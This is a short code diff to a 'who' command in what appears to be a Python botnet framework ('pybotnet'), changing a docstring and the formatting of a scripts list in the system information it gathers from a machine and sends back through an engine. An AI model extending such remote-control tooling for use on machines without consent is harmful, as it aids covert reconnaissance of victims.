@@ -18,12 +18,17 @@ def who(request: Request) -> str:
     * cpu_count
     * pybotnet_version
     
-    system_info cashed for 30 seconds
+    (cache for 30 seconds)
     """
 
     info = ""
 
     for k, v in request.system_info().items():
-        info += f"\n{k}: {v}"
+        if k == "scripts_name":
+            info += "scripts_name:\n"
+            for scripts_name in v:
+                info += f"    {scripts_name}\n"
+        else:
+            info += f"\n{k}: {v}"
 
     request.engine.send(info)
